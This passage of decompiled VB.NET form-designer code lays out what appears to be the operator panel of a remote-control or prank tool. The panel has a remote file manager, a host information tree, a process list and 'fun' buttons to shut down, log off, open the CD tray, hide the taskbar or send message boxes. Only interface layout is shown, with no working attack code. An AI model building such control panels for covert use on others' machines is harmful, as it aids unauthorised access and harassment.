            Me.MoveThisFolderToolStripMenuItem.Image = DirectCast(manager.GetObject("MoveThisFolderToolStripMenuItem.Image"), Image)
            Me.MoveThisFolderToolStripMenuItem.Name = "MoveThisFolderToolStripMenuItem"
            size2 = New Size(&HAB, &H16)
            Me.MoveThisFolderToolStripMenuItem.Size = size2
            Me.MoveThisFolderToolStripMenuItem.Text = "Move this Folder"
            Me.UploadFileToolStripMenuItem2.BackColor = Color.FromArgb(&H2E, &H2E, &H2E)
            Me.UploadFileToolStripMenuItem2.ForeColor = Color.White
            Me.UploadFileToolStripMenuItem2.Image = DirectCast(manager.GetObject("UploadFileToolStripMenuItem2.Image"), Image)
            Me.UploadFileToolStripMenuItem2.Name = "UploadFileToolStripMenuItem2"
            size2 = New Size(&HAB, &H16)
            Me.UploadFileToolStripMenuItem2.Size = size2
            Me.UploadFileToolStripMenuItem2.Text = "Upload File"
            Me.rightclick_filemanagerfiles.Items.AddRange(New ToolStripItem() { Me.RefreshToolStripMenuItem2, Me.CreateNewFileToolStripMenuItem, Me.CreateNewFileToolStripMenuItem2, Me.DeleteFileToolStripMenuItem, Me.RenameFileToolStripMenuItem, Me.CopyFileToolStripMenuItem, Me.MoveFileToolStripMenuItem, Me.DownloadFileToolStripMenuItem, Me.UploadFileToolStripMenuItem1 })
            Me.rightclick_filemanagerfiles.Name = "rightclick_filemanagerfiles"
            size2 = New Size(&HAC, &HCA)
            Me.rightclick_filemanagerfiles.Size = size2
            Me.RefreshToolStripMenuItem2.BackColor = Color.FromArgb(&H2E, &H2E, &H2E)
            Me.RefreshToolStripMenuItem2.ForeColor = Color.White
            Me.RefreshToolStripMenuItem2.Image = DirectCast(manager.GetObject("RefreshToolStripMenuItem2.Image"), Image)
            Me.RefreshToolStripMenuItem2.Name = "RefreshToolStripMenuItem2"
            size2 = New Size(&HAB, &H16)
            Me.RefreshToolStripMenuItem2.Size = size2
            Me.RefreshToolStripMenuItem2.Text = "Refresh"
            Me.CreateNewFileToolStripMenuItem.BackColor = Color.FromArgb(&H2E, &H2E, &H2E)
            Me.CreateNewFileToolStripMenuItem.ForeColor = Color.White
            Me.CreateNewFileToolStripMenuItem.Image = DirectCast(manager.GetObject("CreateNewFileToolStripMenuItem.Image"), Image)
            Me.CreateNewFileToolStripMenuItem.Name = "CreateNewFileToolStripMenuItem"
            size2 = New Size(&HAB, &H16)
            Me.CreateNewFileToolStripMenuItem.Size = size2
            Me.CreateNewFileToolStripMenuItem.Text = "Create New Folder"
            Me.CreateNewFileToolStripMenuItem2.BackColor = Color.FromArgb(&H2E, &H2E, &H2E)
            Me.CreateNewFileToolStripMenuItem2.ForeColor = Color.White
            Me.CreateNewFileToolStripMenuItem2.Image = DirectCast(manager.GetObject("CreateNewFileToolStripMenuItem2.Image"), Image)
            Me.CreateNewFileToolStripMenuItem2.Name = "CreateNewFileToolStripMenuItem2"
            size2 = New Size(&HAB, &H16)
            Me.CreateNewFileToolStripMenuItem2.Size = size2
            Me.CreateNewFileToolStripMenuItem2.Text = "Create New File"
            Me.DeleteFileToolStripMenuItem.BackColor = Color.FromArgb(&H2E, &H2E, &H2E)
            Me.DeleteFileToolStripMenuItem.ForeColor = Color.White
            Me.DeleteFileToolStripMenuItem.Image = DirectCast(manager.GetObject("DeleteFileToolStripMenuItem.Image"), Image)
            Me.DeleteFileToolStripMenuItem.Name = "DeleteFileToolStripMenuItem"
            size2 = New Size(&HAB, &H16)
            Me.DeleteFileToolStripMenuItem.Size = size2
            Me.DeleteFileToolStripMenuItem.Text = "Delete File"
            Me.RenameFileToolStripMenuItem.BackColor = Color.FromArgb(&H2E, &H2E, &H2E)
            Me.RenameFileToolStripMenuItem.ForeColor = Color.White
            Me.RenameFileToolStripMenuItem.Image = DirectCast(manager.GetObject("RenameFileToolStripMenuItem.Image"), Image)
            Me.RenameFileToolStripMenuItem.Name = "RenameFileToolStripMenuItem"
            size2 = New Size(&HAB, &H16)
            Me.RenameFileToolStripMenuItem.Size = size2
            Me.RenameFileToolStripMenuItem.Text = "Rename File"
            Me.CopyFileToolStripMenuItem.BackColor = Color.FromArgb(&H2E, &H2E, &H2E)
            Me.CopyFileToolStripMenuItem.ForeColor = Color.White
            Me.CopyFileToolStripMenuItem.Image = DirectCast(manager.GetObject("CopyFileToolStripMenuItem.Image"), Image)
            Me.CopyFileToolStripMenuItem.Name = "CopyFileToolStripMenuItem"
            size2 = New Size(&HAB, &H16)
            Me.CopyFileToolStripMenuItem.Size = size2
            Me.CopyFileToolStripMenuItem.Text = "Copy File"
            Me.MoveFileToolStripMenuItem.BackColor = Color.FromArgb(&H2E, &H2E, &H2E)
            Me.MoveFileToolStripMenuItem.ForeColor = Color.White
            Me.MoveFileToolStripMenuItem.Image = DirectCast(manager.GetObject("MoveFileToolStripMenuItem.Image"), Image)
            Me.MoveFileToolStripMenuItem.Name = "MoveFileToolStripMenuItem"
            size2 = New Size(&HAB, &H16)
            Me.MoveFileToolStripMenuItem.Size = size2
            Me.MoveFileToolStripMenuItem.Text = "Move File"
            Me.DownloadFileToolStripMenuItem.BackColor = Color.FromArgb(&H2E, &H2E, &H2E)
            Me.DownloadFileToolStripMenuItem.ForeColor = Color.White
            Me.DownloadFileToolStripMenuItem.Image = DirectCast(manager.GetObject("DownloadFileToolStripMenuItem.Image"), Image)
            Me.DownloadFileToolStripMenuItem.Name = "DownloadFileToolStripMenuItem"
            size2 = New Size(&HAB, &H16)
            Me.DownloadFileToolStripMenuItem.Size = size2
            Me.DownloadFileToolStripMenuItem.Text = "Download File"
            Me.UploadFileToolStripMenuItem1.BackColor = Color.FromArgb(&H2E, &H2E, &H2E)
            Me.UploadFileToolStripMenuItem1.ForeColor = Color.White
            Me.UploadFileToolStripMenuItem1.Image = DirectCast(manager.GetObject("UploadFileToolStripMenuItem1.Image"), Image)
            Me.UploadFileToolStripMenuItem1.Name = "UploadFileToolStripMenuItem1"
            size2 = New Size(&HAB, &H16)
            Me.UploadFileToolStripMenuItem1.Size = size2
            Me.UploadFileToolStripMenuItem1.Text = "Upload File"
            Me.rightclick_nothing.Items.AddRange(New ToolStripItem() { Me.RefreshToolStripMenuItem3, Me.CreateNewFolderToolStripMenuItem1, Me.CreateNewFileToolStripMenuItem3, Me.UploadFileToolStripMenuItem })
            Me.rightclick_nothing.Name = "rightclick_nothing"
            size2 = New Size(&HAC, &H5C)
            Me.rightclick_nothing.Size = size2
            Me.RefreshToolStripMenuItem3.BackColor = Color.FromArgb(&H2E, &H2E, &H2E)
            Me.RefreshToolStripMenuItem3.ForeColor = Color.White
            Me.RefreshToolStripMenuItem3.Image = DirectCast(manager.GetObject("RefreshToolStripMenuItem3.Image"), Image)
            Me.RefreshToolStripMenuItem3.Name = "RefreshToolStripMenuItem3"
            size2 = New Size(&HAB, &H16)
            Me.RefreshToolStripMenuItem3.Size = size2
            Me.RefreshToolStripMenuItem3.Text = "Refresh"
            Me.CreateNewFolderToolStripMenuItem1.BackColor = Color.FromArgb(&H2E, &H2E, &H2E)
            Me.CreateNewFolderToolStripMenuItem1.ForeColor = Color.White
            Me.CreateNewFolderToolStripMenuItem1.Image = DirectCast(manager.GetObject("CreateNewFolderToolStripMenuItem1.Image"), Image)
            Me.CreateNewFolderToolStripMenuItem1.Name = "CreateNewFolderToolStripMenuItem1"
            size2 = New Size(&HAB, &H16)
            Me.CreateNewFolderToolStripMenuItem1.Size = size2
            Me.CreateNewFolderToolStripMenuItem1.Text = "Create New Folder"
            Me.CreateNewFileToolStripMenuItem3.BackColor = Color.FromArgb(&H2E, &H2E, &H2E)
            Me.CreateNewFileToolStripMenuItem3.ForeColor = Color.White
            Me.CreateNewFileToolStripMenuItem3.Image = DirectCast(manager.GetObject("CreateNewFileToolStripMenuItem3.Image"), Image)
            Me.CreateNewFileToolStripMenuItem3.Name = "CreateNewFileToolStripMenuItem3"
            size2 = New Size(&HAB, &H16)
            Me.CreateNewFileToolStripMenuItem3.Size = size2
            Me.CreateNewFileToolStripMenuItem3.Text = "Create New File"
            Me.UploadFileToolStripMenuItem.BackColor = Color.FromArgb(&H2E, &H2E, &H2E)
            Me.UploadFileToolStripMenuItem.ForeColor = Color.White
            Me.UploadFileToolStripMenuItem.Image = DirectCast(manager.GetObject("UploadFileToolStripMenuItem.Image"), Image)
            Me.UploadFileToolStripMenuItem.Name = "UploadFileToolStripMenuItem"
            size2 = New Size(&HAB, &H16)
            Me.UploadFileToolStripMenuItem.Size = size2
            Me.UploadFileToolStripMenuItem.Text = "Upload File"
            Me.FormSkin1.BackColor = Color.White
            Me.FormSkin1.BaseColor = Color.FromArgb(&H2E, &H2E, &H2E)
            Me.FormSkin1.BorderColor = Color.FromArgb(&H35, &H3A, 60)
            Me.FormSkin1.Controls.Add(Me.FlatStatusBar1)
            Me.FormSkin1.Controls.Add(Me.DotNetBarTabcontrol1)
            Me.FormSkin1.Controls.Add(Me.FlatMini1)
            Me.FormSkin1.Controls.Add(Me.FlatMax1)
            Me.FormSkin1.Controls.Add(Me.FlatCloseSY1)
            Me.FormSkin1.Dock = DockStyle.Fill
            Me.FormSkin1.FlatColor = Color.White
            Me.FormSkin1.Font = New Font("Segoe UI", 12!)
            Me.FormSkin1.HeaderColor = Color.FromArgb(&H6F, &H1F, &H95)
            Me.FormSkin1.HeaderMaximize = False
            Dim point2 As New Point(0, 0)
            Me.FormSkin1.Location = point2
            Me.FormSkin1.Name = "FormSkin1"
            size2 = New Size(&H349, &H1BD)
            Me.FormSkin1.Size = size2
            Me.FormSkin1.TabIndex = 0
            Me.FormSkin1.Text = "SystemInformation"
            Me.FlatStatusBar1.BaseColor = Color.FromArgb(&H2D, &H2F, &H31)
            Me.FlatStatusBar1.Font = New Font("Segoe UI", 8!)
            Me.FlatStatusBar1.ForeColor = Color.White
            point2 = New Point(0, &H1A9)
            Me.FlatStatusBar1.Location = point2
            Me.FlatStatusBar1.Name = "FlatStatusBar1"
            Me.FlatStatusBar1.RectColor = Color.White
            Me.FlatStatusBar1.ShowTimeDate = False
            size2 = New Size(&H349, 20)
            Me.FlatStatusBar1.Size = size2
            Me.FlatStatusBar1.TabIndex = 4
            Me.FlatStatusBar1.Text = "Idle"
            Me.FlatStatusBar1.TextColor = Color.White
            Me.DotNetBarTabcontrol1.Alignment = TabAlignment.Left
            Me.DotNetBarTabcontrol1.Controls.Add(Me.TabPage1)
            Me.DotNetBarTabcontrol1.Controls.Add(Me.TabPage2)
            Me.DotNetBarTabcontrol1.Controls.Add(Me.TabPage3)
            Me.DotNetBarTabcontrol1.Controls.Add(Me.TabPage4)
            Me.DotNetBarTabcontrol1.Controls.Add(Me.TabPage5)
            Me.DotNetBarTabcontrol1.Controls.Add(Me.TabPage6)
            size2 = New Size(&H2C, &H88)
            Me.DotNetBarTabcontrol1.ItemSize = size2
            point2 = New Point(0, 50)
            Me.DotNetBarTabcontrol1.Location = point2
            Me.DotNetBarTabcontrol1.Multiline = True
            Me.DotNetBarTabcontrol1.Name = "DotNetBarTabcontrol1"
            Me.DotNetBarTabcontrol1.SelectedIndex = 0
            size2 = New Size(&H349, &H176)
            Me.DotNetBarTabcontrol1.Size = size2
            Me.DotNetBarTabcontrol1.SizeMode = TabSizeMode.Fixed
            Me.DotNetBarTabcontrol1.TabIndex = 3
            Me.TabPage1.BackColor = Color.FromArgb(&H2E, &H2E, &H2E)
            Me.TabPage1.Controls.Add(Me.TreeView1)
            point2 = New Point(140, 4)
            Me.TabPage1.Location = point2
            Me.TabPage1.Name = "TabPage1"
            Dim padding2 As New Padding(3)
            Me.TabPage1.Padding = padding2
            size2 = New Size(&H2B9, &H16E)
            Me.TabPage1.Size = size2
            Me.TabPage1.TabIndex = 0
            Me.TabPage1.Text = "Main Information"
            Me.TreeView1.Anchor = (AnchorStyles.Right Or (AnchorStyles.Left Or (AnchorStyles.Bottom Or AnchorStyles.Top)))
            Me.TreeView1.BackColor = Color.FromArgb(&H2E, &H2E, &H2E)
            Me.TreeView1.ContextMenuStrip = Me.rightclicksystem
            Me.TreeView1.Font = New Font("Segoe UI", 9!)
            Me.TreeView1.ForeColor = Color.White
            Me.TreeView1.ImageIndex = 13
            Me.TreeView1.ImageList = Me.ImageList_Info
            Me.TreeView1.LineColor = Color.DeepPink
            point2 = New Point(6, 6)
            Me.TreeView1.Location = point2
            Me.TreeView1.Name = "TreeView1"
            node.ImageKey = "information-white.png"
            node.Name = "computername"
            node.Text = "Computer Name: "
            node12.ImageKey = "user.png"
            node12.Name = "username"
            node12.Text = "Username: "
            node13.ImageKey = "monitor.png"
            node13.Name = "width"
            node13.Text = "Virtual Screen Width: "
            node14.ImageKey = "monitor.png"
            node14.Name = "height"
            node14.Text = "Virtual Screen Height: "
            node15.ImageKey = "memory.png"
            node15.Name = "apm"
            node15.Text = "Available Physical Memory: "
            node16.ImageKey = "memory.png"
            node16.Name = "avm"
            node16.Text = "Available Virtual Memory: "
            node17.ImageKey = "application-monitor.png"
            node17.Name = "osname"
            node17.Text = "OS Full Name: "
            node18.ImageKey = "application-monitor.png"
            node18.Name = "osplattform"
            node18.Text = "OS Platform: "
            node19.ImageKey = "application-monitor.png"
            node19.Name = "osversion"
            node19.Text = "OS Version: "
            node2.ImageKey = "resource-monitor.png"
            node2.Name = "tpm"
            node2.Text = "Total Physical Memory: "
            node3.ImageKey = "resource-monitor.png"
            node3.Name = "tvm"
            node3.Text = "Total Virtual Memory: "
            node4.ImageKey = "battery-charge.png"
            node4.Name = "BCS"
            node4.Text = "Battery Charge Status: "
            node5.ImageKey = "battery.png"
            node5.Name = "bfl"
            node5.Text = "Battery Full Lifetime: "
            node6.ImageKey = "battery.png"
            node6.Name = "blp"
            node6.Text = "Battery Life Percent: "
            node7.ImageKey = "battery--exclamation.png"
            node7.Name = "blr"
            node7.Text = "Battery Life Remaining: "
            node8.ImageKey = "processor.png"
            node8.Name = "cpu"
            node8.Text = "CPU Info: "
            node9.ImageKey = "graphic-card.png"
            node9.Name = "gpu"
            node9.Text = "GPU Name: "
            node10.ImageKey = "application-monitor.png"
            node10.Name = "uptime"
            node10.Text = "Uptime: "
            node11.ImageKey = "computer.png"
            node11.Name = "Knoten0"
            node11.Text = "Computer Information"
            Me.TreeView1.Nodes.AddRange(New TreeNode() { node11 })
            Me.TreeView1.SelectedImageIndex = 13
            size2 = New Size(&H2AB, &H160)
            Me.TreeView1.Size = size2
            Me.TreeView1.TabIndex = 1
            Me.TabPage2.BackColor = Color.FromArgb(&H2E, &H2E, &H2E)
            Me.TabPage2.Controls.Add(Me.listprocess)
            Me.TabPage2.Controls.Add(Me.FlatStatusBarprocess)
            point2 = New Point(140, 4)
            Me.TabPage2.Location = point2
            Me.TabPage2.Name = "TabPage2"
            padding2 = New Padding(3)
            Me.TabPage2.Padding = padding2
            size2 = New Size(&H2B9, &H16E)
            Me.TabPage2.Size = size2
            Me.TabPage2.TabIndex = 1
            Me.TabPage2.Text = "Process Manager"
            Me.listprocess.BackColor = Color.FromArgb(&H2E, &H2E, &H2E)
            Me.listprocess.Columns.AddRange(New ColumnHeader() { Me.ColumnHeader1, Me.ColumnHeader2, Me.ColumnHeader3, Me.ColumnHeader4, Me.ColumnHeader5 })
            Me.listprocess.ContextMenuStrip = Me.rightclickprocess
            Me.listprocess.ForeColor = Color.White
            Me.listprocess.FullRowSelect = True
            Me.listprocess.GridLines = True
            point2 = New Point(6, 6)
            Me.listprocess.Location = point2
            Me.listprocess.Name = "listprocess"
            size2 = New Size(&H2AD, &H14B)
            Me.listprocess.Size = size2
            Me.listprocess.TabIndex = 1
            Me.listprocess.UseCompatibleStateImageBehavior = False
            Me.listprocess.View = View.Details
            Me.ColumnHeader1.Text = "Name"
            Me.ColumnHeader1.Width = &HC5
            Me.ColumnHeader2.Text = "Memory"
            Me.ColumnHeader2.Width = &H93
            Me.ColumnHeader3.Text = "Working"
            Me.ColumnHeader3.Width = 80
            Me.ColumnHeader4.Text = "Initialized"
            Me.ColumnHeader4.Width = &HA5
            Me.ColumnHeader5.Text = "ID"
            Me.ColumnHeader5.Width = &H4A
            Me.FlatStatusBarprocess.BaseColor = Color.FromArgb(&H2D, &H2F, &H31)
            Me.FlatStatusBarprocess.Font = New Font("Segoe UI", 8!)
            Me.FlatStatusBarprocess.ForeColor = Color.White
            point2 = New Point(3, &H157)
            Me.FlatStatusBarprocess.Location = point2
            Me.FlatStatusBarprocess.Name = "FlatStatusBarprocess"
            Me.FlatStatusBarprocess.RectColor = Color.DeepPink
            Me.FlatStatusBarprocess.ShowTimeDate = False
            size2 = New Size(&H2B3, 20)
            Me.FlatStatusBarprocess.Size = size2
            Me.FlatStatusBarprocess.TabIndex = 0
            Me.FlatStatusBarprocess.Text = "Idle"
            Me.FlatStatusBarprocess.TextColor = Color.White
            Me.TabPage3.BackColor = Color.FromArgb(&H2E, &H2E, &H2E)
            Me.TabPage3.Controls.Add(Me.FlatGroupBox2)
            Me.TabPage3.Controls.Add(Me.FlatGroupBox1)
            point2 = New Point(140, 4)
            Me.TabPage3.Location = point2
            Me.TabPage3.Name = "TabPage3"
            size2 = New Size(&H2B9, &H16E)
            Me.TabPage3.Size = size2
            Me.TabPage3.TabIndex = 2
            Me.TabPage3.Text = "Fun Manager"
            Me.FlatGroupBox2.BackColor = Color.Transparent
            Me.FlatGroupBox2.BaseColor = Color.FromArgb(&H6F, &H1F, &H95)
            Me.FlatGroupBox2.Controls.Add(Me.btn_send)
            Me.FlatGroupBox2.Controls.Add(Me.btn_test)
            Me.FlatGroupBox2.Controls.Add(Me.ComboBox2)
            Me.FlatGroupBox2.Controls.Add(Me.ComboBox1)
            Me.FlatGroupBox2.Controls.Add(Me.FlatLabel3)
            Me.FlatGroupBox2.Controls.Add(Me.FlatLabel2)
            Me.FlatGroupBox2.Controls.Add(Me.rtb_prompt)
            Me.FlatGroupBox2.Controls.Add(Me.Prompt)
            Me.FlatGroupBox2.Controls.Add(Me.tb_title)
            Me.FlatGroupBox2.Controls.Add(Me.FlatLabel1)
            Me.FlatGroupBox2.Font = New Font("Segoe UI", 10!)
            point2 = New Point(&H15D, 3)
            Me.FlatGroupBox2.Location = point2
            Me.FlatGroupBox2.Name = "FlatGroupBox2"
            Me.FlatGroupBox2.ShowText = True
            size2 = New Size(&H15C, 360)
            Me.FlatGroupBox2.Size = size2
            Me.FlatGroupBox2.TabIndex = 1
            Me.FlatGroupBox2.Text = "MessageBox"
            Me.btn_send.BackColor = Color.Transparent
            Me.btn_send.BaseColor = Color.DeepPink
            Me.btn_send.Cursor = Cursors.Hand
            Me.btn_send.Font = New Font("Segoe UI", 12!)
            point2 = New Point(&HAD, &H135)
            Me.btn_send.Location = point2
            Me.btn_send.Name = "btn_send"
            Me.btn_send.Rounded = False
            size2 = New Size(&H6A, &H20)
            Me.btn_send.Size = size2
            Me.btn_send.TabIndex = 8
            Me.btn_send.Text = "Send"
            Me.btn_send.TextColor = Color.FromArgb(&HF3, &HF3, &HF3)
            Me.btn_test.BackColor = Color.Transparent
            Me.btn_test.BaseColor = Color.White
            Me.btn_test.Cursor = Cursors.Hand
            Me.btn_test.Font = New Font("Segoe UI", 12!)
            point2 = New Point(&H43, &H135)
            Me.btn_test.Location = point2
            Me.btn_test.Name = "btn_test"
            Me.btn_test.Rounded = False
            size2 = New Size(&H6A, &H20)
            Me.btn_test.Size = size2
            Me.btn_test.TabIndex = 7
            Me.btn_test.Text = "Test"
            Me.btn_test.TextColor = Color.Black
            Me.ComboBox2.BackColor = Color.FromArgb(&H2D, &H2D, &H30)
            Me.ComboBox2.Cursor = Cursors.Hand
            Me.ComboBox2.DrawMode = DrawMode.OwnerDrawFixed
            Me.ComboBox2.DropDownStyle = ComboBoxStyle.DropDownList
            Me.ComboBox2.Font = New Font("Segoe UI", 8!)
            Me.ComboBox2.ForeColor = Color.White
            Me.ComboBox2.FormattingEnabled = True
            Me.ComboBox2.HoverColor = Color.DeepPink
            Me.ComboBox2.ItemHeight = &H12
            Me.ComboBox2.Items.AddRange(New Object() { "Astersik", "Error", "Exclamation", "Hand", "Information", "None", "Question", "Stop", "Warning" })
            point2 = New Point(&H9C, &H10A)
            Me.ComboBox2.Location = point2
            Me.ComboBox2.Name = "ComboBox2"
            size2 = New Size(&HA9, &H18)
            Me.ComboBox2.Size = size2
            Me.ComboBox2.TabIndex = 6
            Me.ComboBox1.BackColor = Color.FromArgb(&H2D, &H2D, &H30)
            Me.ComboBox1.Cursor = Cursors.Hand
            Me.ComboBox1.DrawMode = DrawMode.OwnerDrawFixed
            Me.ComboBox1.DropDownStyle = ComboBoxStyle.DropDownList
            Me.ComboBox1.Font = New Font("Segoe UI", 8!)
            Me.ComboBox1.ForeColor = Color.White
            Me.ComboBox1.FormattingEnabled = True
            Me.ComboBox1.HoverColor = Color.DeepPink
            Me.ComboBox1.ItemHeight = &H12
            Me.ComboBox1.Items.AddRange(New Object() { "AbortRetryIgnore", "OK", "OKCancel", "RetryCancel", "YesNo", "YesNoCancel" })
            point2 = New Point(&H9C, &HEC)
            Me.ComboBox1.Location = point2
            Me.ComboBox1.Name = "ComboBox1"
            size2 = New Size(&HA9, &H18)
            Me.ComboBox1.Size = size2
            Me.ComboBox1.TabIndex = 5
            Me.FlatLabel3.AutoSize = True
            Me.FlatLabel3.BackColor = Color.Transparent
            Me.FlatLabel3.Font = New Font("Segoe UI", 10!)
            Me.FlatLabel3.ForeColor = Color.White
            point2 = New Point(&H10, &HEF)
            Me.FlatLabel3.Location = point2
            Me.FlatLabel3.Name = "FlatLabel3"
            size2 = New Size(&H86, &H13)
            Me.FlatLabel3.Size = size2
            Me.FlatLabel3.TabIndex = 4
            Me.FlatLabel3.Text = "MessageBoxButton: "
            Me.FlatLabel2.AutoSize = True
            Me.FlatLabel2.BackColor = Color.Transparent
            Me.FlatLabel2.Font = New Font("Segoe UI", 10!)
            Me.FlatLabel2.ForeColor = Color.White
            point2 = New Point(&H10, &H10C)
            Me.FlatLabel2.Location = point2
            Me.FlatLabel2.Name = "FlatLabel2"
            size2 = New Size(&H76, &H13)
            Me.FlatLabel2.Size = size2
            Me.FlatLabel2.TabIndex = 4
            Me.FlatLabel2.Text = "MessageBoxIcon: "
            Me.rtb_prompt.BackColor = Color.FromArgb(&H6F, &H1F, &H95)
            Me.rtb_prompt.ForeColor = Color.White
            point2 = New Point(20, &H7A)
            Me.rtb_prompt.Location = point2
            Me.rtb_prompt.Name = "rtb_prompt"
            size2 = New Size(&H131, &H60)
            Me.rtb_prompt.Size = size2
            Me.rtb_prompt.TabIndex = 3
            Me.rtb_prompt.Text = ""
            Me.Prompt.AutoSize = True
            Me.Prompt.BackColor = Color.Transparent
            Me.Prompt.Font = New Font("Segoe UI", 10!)
            Me.Prompt.ForeColor = Color.White
            point2 = New Point(&H10, 100)
            Me.Prompt.Location = point2
            Me.Prompt.Name = "Prompt"
            size2 = New Size(&H3E, &H13)
            Me.Prompt.Size = size2
            Me.Prompt.TabIndex = 2
            Me.Prompt.Text = "Prompt: "
            Me.tb_title.BackColor = Color.Transparent
            point2 = New Point(20, &H3D)
            Me.tb_title.Location = point2
            Me.tb_title.MaxLength = &H7FFF
            Me.tb_title.Multiline = False
            Me.tb_title.Name = "tb_title"
            Me.tb_title.ReadOnly = False
            size2 = New Size(&H131, &H1D)
            Me.tb_title.Size = size2
            Me.tb_title.TabIndex = 1
            Me.tb_title.TextAlign = HorizontalAlignment.Left
            Me.tb_title.TextColor = Color.FromArgb(&HC0, &HC0, &HC0)
            Me.tb_title.UseSystemPasswordChar = False
            Me.FlatLabel1.AutoSize = True
            Me.FlatLabel1.BackColor = Color.Transparent
            Me.FlatLabel1.Font = New Font("Segoe UI", 10!)
            Me.FlatLabel1.ForeColor = Color.White
            point2 = New Point(&H10, &H27)
            Me.FlatLabel1.Location = point2
            Me.FlatLabel1.Name = "FlatLabel1"
            size2 = New Size(&H29, &H13)
            Me.FlatLabel1.Size = size2
            Me.FlatLabel1.TabIndex = 0
            Me.FlatLabel1.Text = "Title: "
            Me.FlatGroupBox1.BackColor = Color.FromArgb(&H2E, &H2E, &H2E)
            Me.FlatGroupBox1.BaseColor = Color.White
            Me.FlatGroupBox1.Controls.Add(Me.btn_stopdiscomouse)
            Me.FlatGroupBox1.Controls.Add(Me.btn_startdiscomouse)
            Me.FlatGroupBox1.Controls.Add(Me.btn_logoff)
            Me.FlatGroupBox1.Controls.Add(Me.btn_shutdown)
            Me.FlatGroupBox1.Controls.Add(Me.btn_restart)
            Me.FlatGroupBox1.Controls.Add(Me.btn_changewp)
            Me.FlatGroupBox1.Controls.Add(Me.btn_openweb)
            Me.FlatGroupBox1.Controls.Add(Me.btn_speak)
            Me.FlatGroupBox1.Controls.Add(Me.btn_undo)
            Me.FlatGroupBox1.Controls.Add(Me.btn_swap)
            Me.FlatGroupBox1.Controls.Add(Me.btn_closecd)
            Me.FlatGroupBox1.Controls.Add(Me.btn_opencd)
            Me.FlatGroupBox1.Controls.Add(Me.btn_showdi)
            Me.FlatGroupBox1.Controls.Add(Me.btn_hidedi)
            Me.FlatGroupBox1.Controls.Add(Me.btn_showtb)
            Me.FlatGroupBox1.Controls.Add(Me.btn_hidetb)
            Me.FlatGroupBox1.Font = New Font("Segoe UI", 10!)
            point2 = New Point(3, 3)
            Me.FlatGroupBox1.Location = point2
            Me.FlatGroupBox1.Name = "FlatGroupBox1"
            Me.FlatGroupBox1.ShowText = True
            size2 = New Size(&H164, 360)
            Me.FlatGroupBox1.Size = size2
            Me.FlatGroupBox1.TabIndex = 0
            Me.FlatGroupBox1.Text = "FUN Buttons"
            Me.btn_stopdiscomouse.BackColor = Color.Transparent
            Me.btn_stopdiscomouse.BaseColor = Color.FromArgb(&H2E, &H2E, &H2E)
            Me.btn_stopdiscomouse.Cursor = Cursors.Hand
            Me.btn_stopdiscomouse.Font = New Font("Segoe UI", 12!)
            point2 = New Point(&HB8, &H132)
            Me.btn_stopdiscomouse.Location = point2
            Me.btn_stopdiscomouse.Name = "btn_stopdiscomouse"
            Me.btn_stopdiscomouse.Rounded = False
            size2 = New Size(&H9B, &H20)
            Me.btn_stopdiscomouse.Size = size2
            Me.btn_stopdiscomouse.TabIndex = 15
            Me.btn_stopdiscomouse.Text = "Stop DiscoMouse"
            Me.btn_stopdiscomouse.TextColor = Color.FromArgb(&HF3, &HF3, &HF3)
            Me.btn_startdiscomouse.BackColor = Color.Transparent
            Me.btn_startdiscomouse.BaseColor = Color.FromArgb(&H2E, &H2E, &H2E)
            Me.btn_startdiscomouse.Cursor = Cursors.Hand
            Me.btn_startdiscomouse.Font = New Font("Segoe UI", 12!)
            point2 = New Point(&H13, &H132)
            Me.btn_startdiscomouse.Location = point2
            Me.btn_startdiscomouse.Name = "btn_startdiscomouse"
            Me.btn_startdiscomouse.Rounded = False
            size2 = New Size(&H9F, &H20)
            Me.btn_startdiscomouse.Size = size2
            Me.btn_startdiscomouse.TabIndex = 14
            Me.btn_startdiscomouse.Text = "Start DiscoMouse"
            Me.btn_startdiscomouse.TextColor = Color.FromArgb(&HF3, &HF3, &HF3)
            Me.btn_logoff.BackColor = Color.Transparent
            Me.btn_logoff.BaseColor = Color.DeepPink
            Me.btn_logoff.Cursor = Cursors.Hand
            Me.btn_logoff.Font = New Font("Segoe UI", 12!)
            point2 = New Point(&HB8, &H10C)
            Me.btn_logoff.Location = point2
            Me.btn_logoff.Name = "btn_logoff"
            Me.btn_logoff.Rounded = False
            size2 = New Size(&H9B, &H20)
            Me.btn_logoff.Size = size2
            Me.btn_logoff.TabIndex = 13
            Me.btn_logoff.Text = "Logout Computer"
            Me.btn_logoff.TextColor = Color.FromArgb(&HF3, &HF3, &HF3)
            Me.btn_shutdown.BackColor = Color.Transparent
            Me.btn_shutdown.BaseColor = Color.DeepPink
            Me.btn_shutdown.Cursor = Cursors.Hand
            Me.btn_shutdown.Font = New Font("Segoe UI", 12!)
            point2 = New Point(&H13, &H10C)
            Me.btn_shutdown.Location = point2
            Me.btn_shutdown.Name = "btn_shutdown"
            Me.btn_shutdown.Rounded = False
            size2 = New Size(&H9F, &H20)
            Me.btn_shutdown.Size = size2
            Me.btn_shutdown.TabIndex = 12
            Me.btn_shutdown.Text = "Shutdown Computer"
            Me.btn_shutdown.TextColor = Color.FromArgb(&HF3, &HF3, &HF3)
            Me.btn_restart.BackColor = Color.Transparent
            Me.btn_restart.BaseColor = Color.FromArgb(&H6F, &H1F, &H95)
            Me.btn_restart.Cursor = Cursors.Hand
            Me.btn_restart.Font = New Font("Segoe UI", 12!)
            point2 = New Point(&HB8, 230)
            Me.btn_restart.Location = point2
            Me.btn_restart.Name = "btn_restart"
            Me.btn_restart.Rounded = False
            size2 = New Size(&H9B, &H20)
            Me.btn_restart.Size = size2
            Me.btn_restart.TabIndex = 11
            Me.btn_restart.Text = "Restart Computer"
            Me.btn_restart.TextColor = Color.FromArgb(&HF3, &HF3, &HF3)
            Me.btn_changewp.BackColor = Color.Transparent
            Me.btn_changewp.BaseColor = Color.FromArgb(&H6F, &H1F, &H95)
            Me.btn_changewp.Cursor = Cursors.Hand
            Me.btn_changewp.Font = New Font("Segoe UI", 12!)
            point2 = New Point(&H13, 230)
            Me.btn_changewp.Location = point2
            Me.btn_changewp.Name = "btn_changewp"
            Me.btn_changewp.Rounded = False
            size2 = New Size(&H9F, &H20)
            Me.btn_changewp.Size = size2
            Me.btn_changewp.TabIndex = 10
            Me.btn_changewp.Text = "Change Wallpaper"
            Me.btn_changewp.TextColor = Color.FromArgb(&HF3, &HF3, &HF3)
            Me.btn_openweb.BackColor = Color.Transparent
            Me.btn_openweb.BaseColor = Color.FromArgb(&H2E, &H2E, &H2E)
            Me.btn_openweb.Cursor = Cursors.Hand
            Me.btn_openweb.Font = New Font("Segoe UI", 12!)
